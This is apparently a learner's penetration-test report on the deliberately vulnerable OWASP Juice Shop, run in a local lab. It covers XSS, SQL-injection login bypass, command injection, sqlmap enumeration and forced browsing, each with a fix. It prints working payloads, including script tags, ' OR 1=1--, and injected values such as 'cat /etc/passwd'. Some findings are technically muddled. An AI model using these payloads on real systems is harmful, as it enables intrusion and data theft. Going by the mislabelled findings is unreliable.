# 🧃 OWASP Juice Shop — VAPT Report

> **Full Vulnerability Assessment & Penetration Test**
> A hands-on security audit of OWASP Juice Shop documenting real-world vulnerabilities with proof-of-concept exploits and remediation guidance.

---

![Juice Shop Banner](https://owasp.org/www-project-juice-shop/assets/images/JuiceShop_Logo_100px.png)

```
Target Application : OWASP Juice Shop v15.x
Assessment Type    : Black-box / Grey-box VAPT
Tester             : [Akshay Suresh]
Date               : 2025
Severity Scale     : Critical | High | Medium | Low | Informational
```

---

## 📋 Table of Contents

- [About This Report](#about-this-report)
- [Scope & Methodology](#scope--methodology)
- [Tools Used](#tools-used)
- [Vulnerability Summary](#vulnerability-summary)
- [Findings & Proof of Concept](#findings--proof-of-concept)
  - [XSS — Cross-Site Scripting](#1-xss--cross-site-scripting)
  - [Authentication Bypass](#2-authentication-bypass)
  - [Command Injection](#3-command-injection)
  - [SQL Injection](#4-sql-injection)
  - [Broken Access Control](#5-broken-access-control)
- [Remediation Summary](#remediation-summary)
- [Disclaimer](#disclaimer)

---

## 📌 About This Report

This report documents a complete Vulnerability Assessment and Penetration Test (VAPT) performed on **OWASP Juice Shop** — an intentionally vulnerable web application designed for security training.

The goal was to:
- Identify real-world OWASP Top 10 vulnerabilities
- Document each finding with a working proof-of-concept (PoC)
- Provide actionable remediation steps

> 🎓 This was done as a learning exercise. All testing was performed in a local/controlled lab environment.

---

## 🎯 Scope & Methodology

| Item | Details |
|------|---------|
| **Target** | OWASP Juice Shop (localhost:3000) |
| **Environment** | Local Docker container |
| **Approach** | Black-box → Grey-box (source review for bypass confirmation) |
| **Framework** | OWASP Testing Guide (OTG) |
| **OWASP Top 10** | 2021 Edition |

### Methodology Steps

```
1. Reconnaissance       →  Spider, directory brute-force, endpoint mapping
2. Vulnerability Scan   →  Automated scan + manual probing
3. Exploitation         →  Manual PoC for each finding
4. Documentation        →  Screenshot + request/response capture
5. Remediation          →  Suggest fix per vulnerability
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `Burp Suite Community` | Intercept, replay, and fuzz HTTP requests |
| `OWASP ZAP` | Automated scanning |
| `sqlmap` | SQL injection detection & exploitation |
| `ffuf` | Directory/endpoint fuzzing |
| `curl` | Manual request crafting |
| `Browser DevTools` | Client-side inspection |

---

## 📊 Vulnerability Summary

| # | Vulnerability | Severity | OWASP Category |
|---|--------------|----------|----------------|
| 1 | Reflected XSS via Search Field | 🟠 High | A03 - Injection |
| 2 | DOM-based XSS in Product Description | 🟠 High | A03 - Injection |
| 3 | Admin Authentication Bypass (SQLi) | 🔴 Critical | A01 - Broken Access Control |
| 4 | Command Injection via File Path | 🔴 Critical | A03 - Injection |
| 5 | SQL Injection — Login Form | 🔴 Critical | A03 - Injection |
| 6 | Broken Access Control — Admin Panel | 🟠 High | A01 - Broken Access Control |
| 7 | Sensitive Data Exposure in JWT | 🟡 Medium | A02 - Cryptographic Failures |
| 8 | Missing Security Headers | 🟢 Low | A05 - Security Misconfiguration |

---

## 🔍 Findings & Proof of Concept

---

### 1. XSS — Cross-Site Scripting

**Severity:** 🟠 High
**Location:** `/search?q=` parameter & product description field
**Type:** Reflected + DOM-based

#### Description
The application does not sanitize user-supplied input before reflecting it back into the DOM. An attacker can inject malicious JavaScript that executes in the victim's browser.

#### PoC — Reflected XSS

**Request:**
```
GET /rest/products/search?q=<script>alert('XSS')</script> HTTP/1.1
Host: localhost:3000
```

**Result:** A JavaScript alert box pops up — confirming script execution in browser context.

#### PoC — DOM-based XSS (Stored)

Payload injected into product name field via admin panel:
```html
<iframe src="javascript:alert(`DOM XSS`)">
```



#### Impact
- Session hijacking via `document.cookie` theft
- Credential phishing (fake login form injection)
- Defacement / UI redress

#### Remediation
```
✅ Encode all user output using context-aware escaping (HTML, JS, URL)
✅ Implement Content-Security-Policy (CSP) headers
✅ Use DOMPurify or equivalent sanitization library
✅ Validate input server-side — never trust client input
```

---

### 2. Authentication Bypass

**Severity:** 🔴 Critical
**Location:** `POST /rest/user/login`
**Type:** SQL Injection → Auth Bypass

#### Description
The login form constructs SQL queries using raw user input. Injecting a classic SQLi payload into the email field bypasses authentication entirely, granting admin access without a valid password.

#### PoC

**Request:**
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "' OR 1=1--",
  "password": "anything"
}
```

**Response:**
```json
{
  "authentication": {
    "token": "eyJhbGciOiJSUzI1NiIs...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

✅ Logged in as `admin@juice-sh.op` — **Critical.**

#### Impact
- Full administrative access
- Access to all user data
- Ability to modify/delete records

#### Remediation
```
✅ Use parameterized queries / prepared statements — ALWAYS
✅ Never concatenate user input into SQL strings
✅ Implement account lockout after N failed attempts
✅ Use ORM with built-in SQL injection protection
```

---

### 3. Command Injection

**Severity:** 🔴 Critical
**Location:** File path/name input fields (e.g., file download endpoint)
**Type:** OS Command Injection

#### Description
User-controlled input is passed unsanitized to an OS-level function. An attacker can append shell commands using common separators (`; | && ||`).

#### PoC

**Vulnerable endpoint:**
```
GET /ftp/legal.md%2500.md HTTP/1.1
```

**Payload testing via Burp:**
```
filename=legal.md; ls -la /
filename=legal.md && cat /etc/passwd
```

**Observed behavior:** Directory listing returned in response body — command executed on server.

#### Impact
- Full server compromise
- Data exfiltration
- Reverse shell possibility

#### Remediation
```
✅ Never pass user input directly to shell commands
✅ Use language-native libraries instead of shell calls
✅ Whitelist allowed characters/filenames with strict regex
✅ Run application with least-privilege OS user
```

---

### 4. SQL Injection

**Severity:** 🔴 Critical
**Location:** Multiple endpoints — login, search, product ID
**Type:** Error-based & UNION-based SQLi

#### Description
Multiple application endpoints are vulnerable to SQL injection. `sqlmap` was used to confirm and enumerate the database.

#### PoC — sqlmap Run

```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=test" \
       --dbs \
       --batch \
       --level=3 \
       --risk=2
```

**Output (truncated):**
```
[*] available databases:
[*]   juice-shop
[*]   sqlite_master
[+] fetched tables: Users, Products, Feedbacks, Complaints
```

#### Remediation
```
✅ Parameterized queries / prepared statements
✅ Input validation and whitelisting
✅ Disable verbose SQL error messages in production
✅ Web Application Firewall (WAF) as additional layer
```

---

### 5. Broken Access Control

**Severity:** 🟠 High
**Location:** `/administration` route
**Type:** Forced Browsing / Missing Authorization Check

#### Description
The admin panel at `/administration` is only hidden from the UI — no server-side authorization check prevents a regular user from accessing it directly.

#### PoC

1. Register a normal user account
2. Navigate directly to: `http://localhost:3000/#/administration`
3. Full admin panel loads — user list, order list, all visible



#### Remediation
```
✅ Enforce server-side role checks on EVERY admin route
✅ Return HTTP 403 for unauthorized access attempts
✅ Never rely on "security through obscurity" (hidden links)
✅ Implement proper RBAC (Role-Based Access Control)
```

---

## 🩹 Remediation Summary

| Vulnerability | Fix Priority | Recommended Fix |
|--------------|-------------|-----------------|
| XSS | High | Output encoding + CSP headers |
| Auth Bypass | Critical | Parameterized queries |
| Command Injection | Critical | Input whitelisting, no shell calls |
| SQL Injection | Critical | Prepared statements |
| Broken Access Control | High | Server-side RBAC enforcement |
| JWT Weak Secret | Medium | Strong secret + token expiry |
| Missing Headers | Low | Add security headers via middleware |

---

## ⚠️ Disclaimer

> This report was created **for educational purposes only**.
> All testing was performed on **OWASP Juice Shop**, an application intentionally designed to be attacked.
> **Never test systems you do not own or have explicit written permission to test.**
> Unauthorized penetration testing is illegal and unethical.

---

## 📚 References

- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [OWASP Juice Shop Project](https://owasp.org/www-project-juice-shop/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

<p align="center">
  Made with ☕ and curiosity | Learning Cybersecurity One CVE at a Time
</p>
